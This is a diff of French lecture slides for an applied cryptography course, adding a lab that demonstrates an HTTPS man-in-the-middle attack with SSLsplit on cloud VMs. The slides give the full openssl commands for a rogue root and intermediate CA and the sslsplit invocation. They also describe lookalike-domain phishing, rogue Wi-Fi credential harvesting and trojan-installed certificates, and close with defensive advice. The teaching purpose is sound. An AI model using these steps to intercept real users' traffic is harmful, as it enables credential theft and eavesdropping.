@@ -1,6 +1,6 @@
 ---
-title: Cours 11 - Infonuagique et cryptographie
-description: Infonuagique et cryptographie
+title: Cours 11 - Démo SSLSPLIT
+description: Attaque MITM sur un site sécurisé
 theme: night
 date: 2017-1-19
 reveal_config:
@@ -14,10 +14,179 @@ reveal_config:
   # Cryptographie appliquée
   ## Cours 11
 </section>
+
 <section>
   <section data-markdown>
-    # Cryptographiet et infonuagique
-    ## Conference:
-    ## Maya Kaczorowski, Product Manager, Google Cloud Platform
+    # Démo avec 2 VM (serveur et attaquant) sur le même réseau.
+    ## GCP, AWS ou VM locales.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - serveur cible
+    * Machines micro debian 8 jessie allow http et https
+
+    * 'sudo apt-get install apache2' et 'sudo apt-get install python-certbot-apache -t jessie-backports'
+
+    * Tester connexion ssl et fournir adresse ip pour lier le domaine.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - serveur cible
+    * Configurer apache avec un certificat Let’s encrypt.
+
+    * 'sudo certbot --apache'
+
+    * Remplir les informations et choisir le mode Easy.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Démarrer 2e machine, attaquant, avec les mêmes paramètres, dans la même zone mais aller activer le IP forwarding dans les configurations avancées sous l’onglet Networking
+
+    * 'sudo apt-get install apache2 openssl sslstrip'
+
+    * Let’s encrypt génère un certificat valide, on voudra faire un MITM et générer nos propres certificats.
+
+    *  L’outil va nous permettre de générer nos propres certificats mais on ne sera pas en mesure de les valider, la victime non plus.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Besoin d’une structure de répertoires avec bons fichiers afin que notre autorité garde une trace.
+
+    * 'mkdir ca' 'cd ca' 'mkdir certls crl newcerts private' 'chmod 700 private' 'touch index.txt' 'echo 1000 > serial' 'ls'
+
+    * Télécharger 'openssl.cnf' pour définir la configuration de l’autorité de certification.
+
+    * Spécifie des répertoires, définit de l’information pour l’algorithme de signature, types de certificats qu’on peut signer et configurations par défaut.
+
+    * éditer avec 'vi' ou 'nano' : modifier la ligne 7 par $chemin
+
+    * 'pwd' pour le connaitre à partir du répertoire 'ca'
+  </section>
+
+  <section data-markdown>
+    ## Démo WireShark
+    * Pour voir différences de trafic http et https.
+
+    * Le protocole http permet de voir le code html retourné.
+
+    * Le protocole https permet de voir les étapes de l’échange de clés mais chiffre le trafic qui suivra.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * 'sudo apt-get install build-essential pkg-config libssl-dev libevent-dev bzip2'
+
+    * 'wget http://mirror.roe.ch/rel/sslsplit/sslsplit-0.5.0.tar.bz2'
+
+    * 'bunzip2 sslsplit-0.5.0.tar.bz2' et 'tar -xvf sslsplit-0.5.0.tar'
+
+    * 'cd sslsplit-0.5.0' 'make' 'sudo make install' 'sslsplit -h'
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Générer une clé de chiffrement et mettre un passpharase, en prod on metterait un mot de passe fort mais ici un simple suffit.
+
+    * 'openssl genrsa -aes256 -out private/ca.key.pem 4096' et 'chmod 400 private/ca.key.pem'
+
+    * Configurer le certificat autour de la clé publique de notre autorité de certification, mettre le passphrase et insérer les métadonnées d’identité et changer les permissions
+
+    * 'openssl req -config openssl.cnf  -key private/ca.key.pem  -new -x509 -days 7300 -sha256 -extensions v3_ca -out certs/ca.cert.pem' 'chmod 444 certs/ca.cert.pem'
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Créer ensuite un CA intermédiaire.
+
+    * 'mkdir intermediate' 'cd intermediate'  'mkdir certls crl newcerts private' 'chmod 700 private' 'touch index.txt' 'echo 1000 > serial' 'ls' 'echo 1000 > crlnumber'
+
+    * 'echo 1000 > crlnumber' Initialise liste de révocation
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Télécharger 'openssl-intermediate.cnf' pour définir la configuration de l’autorité intermédiaire.
+
+    * Spécifie des répertoires, définit de l’information pour l’algorithme de signature, types de certificats qu’on peut signer et configurations par défaut.
+
+    * éditer avec 'vi' ou 'nano' : modifier la ligne 7 par $chemin
+
+    * 'pwd' pour le connaitre à partir du répertoire 'intermediate'
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * À partir du répertoire 'ca', créer paire de clés pour le certificat
+
+    * 'openssl genrsa -aes256  -out intermediate/private/intermediate.key.pem 4096'
+
+    * 'openssl req -config intermediate/openssl.cnf -new -sha256 -key intermediate/private/intermediate.key.pem -out intermediate/csr/intermediate.csr.pem'
+
+    * Entrer les métadonnées avec les mêmes pays, province et localité que l’autorité
+  </section>
+
+  <section data-markdown>
+    ## Labo - Sur GCP - attaquant
+    * Pour signer le certificat
+
+    * 'openssl ca -config openssl.cnf -extensions v3_intermediate_ca -days 3650 -notext -md sha256 -in intermediate/csr/intermediate.csr.pem -out intermediate/certs/intermediate.cert.pem'
+
+    * Pour vérifier le certificat intermédiaire
+
+    * 'openssl x509 -noout –text -in intermediate/certs/intermediate.cert.pem'
+
+    * 'sudo sslsplit -c intermediate/certs/intermediate.cert.pem -k intermediate/private/intermediate.key.pem -C certs/ca.cert.pem https 0.0.0.0 443 monnomdedomaine.tld 443'
+  </section>
+
+  <section data-markdown>
+    ## Labo - Théorie
+    * L’outil SslSplit va intercepter des connexions, les rediriger au bon serveur et présenter un certificat qu’il a généré lui-même après avoir intercepté le trafic.
+
+    * Si on se connecte en https sur l’attaquant,  on va commencer par avoir une erreur qui nous dit que le certificat n’est pas signé par une autorité de confiance.
+
+    * Notre OS et browser ne connaissent pas notre autorité intermédiaire ni notre root ca.
+
+    * Cette erreur est importante car si on continue, la bonne page sera quand même affichée mais le trafic sera lisible par SslSplit.
+
+    * Certains anti-virus font ce genre d’attaque pour analyser le trafic.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Théorie
+    * SslSplit est transparent à part l’erreur de confiance.
+
+    * Le vrai site est transféré par le proxy.
+
+    * Technique utilisée pour le phishing, enregistrer un domaine qui ressemble à un domaine authentique et l’envoyer à une cible puis intercepter des informations sensibles.
+
+    * Phishing standard on va simuler le site final ce qui peut être facilement détectable mais SslSplit présente le bon site.
+
+    * Problème des utilisateurs qui ignorent les erreurs de certificats.
+
+    *  Certains attaquants vont envoyer le certificat via un trojan, par exemple inclus à un installateur de logiciel.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Théorie
+    * En entreprise, si on effectue cette attaque pour surveiller le trafic des utilisateurs c’est ce qui est utilisé.
+
+    * Vecteur d’attaque sans-fil, possible de prendre un adapteur WiFi et démarrer un logiciel qui va scanner les demandes pour les réseaux non-sécurisés, ex réseaux sauvegardés sur un appareil mobile.
+
+    * Le logiciel va répondre à cette demande et l’appareil se connectera puis SslSplit pourra déchiffrer tout le trafic sécurisé, erreur de certificat plus difficile à remarquer sur un mobile.
+
+    * Une fois connecté, l’appareil va tenter de se connecter à tous les services installés ayant accès au réseau : compte email, facebook, twitter, etc. et envoyer les authentifiants.
+  </section>
+
+  <section data-markdown>
+    ## Labo - Théorie
+    * Dans les réseaux publics on a souvent tendance à accepter les erreurs car ils sont souvent mal configurés.
+
+    * Scanner les réseaux sans-fil avant de se connecter, se méfier des réseaux qui changent de nom souvent, possible de configurer les appareils mobiles pour ignorer les erreurs de certificat…
+
+    * Ne jamais accepter d’erreurs de certificats, c’est trop louche.
+
+    * Ne pas se connecter à des réseaux non-sécurisés mais si on a pas le choix, par exemple dans un hôtel, s’assurer que ce réseau est supprimé après avoir quitté les lieux pour réduire les probabilités de ce type d’attaque.
   </section>
 </section>
